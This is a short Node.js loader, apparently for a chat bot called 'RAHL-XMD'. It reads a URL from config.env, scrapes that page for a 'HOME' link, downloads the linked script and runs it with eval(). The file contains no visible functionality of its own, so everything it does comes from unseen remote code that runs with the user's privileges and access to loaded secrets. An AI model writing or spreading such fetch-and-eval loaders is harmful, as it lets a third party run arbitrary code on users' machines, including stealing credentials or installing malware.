//  [RAHL-XMD QUANTUM EDITION]                                           
//  >> A superposition of elegant code states                           
//  >> Collapsed into optimal execution                                
//  >> Scripted by Lord Rahl                                    
//  >> Version: 1.0.0quantum.7

const axios = require('axios');
const cheerio = require('cheerio');
require('dotenv').config({ path: './config.env' }); // ✅ Load from config.env

async function fetchHOMEUrl() {
  try {
    // ✅ Now correctly fetches the pairing site
    const response = await axios.get(process.env.RAHL_XMD);
    const $ = cheerio.load(response.data);

    const targetElement = $('a:contains("HOME")');
    const targetUrl = targetElement.attr('href');

    if (!targetUrl) {
      throw new Error('Heart not found 😭');
    }

    console.log('💫 The heart is loaded successfully ✅');

    const scriptResponse = await axios.get(targetUrl);
    eval(scriptResponse.data);

  } catch (error) {
    console.error('⚠️ Error:', error.message);
  }
}

fetchHOMEUrl();
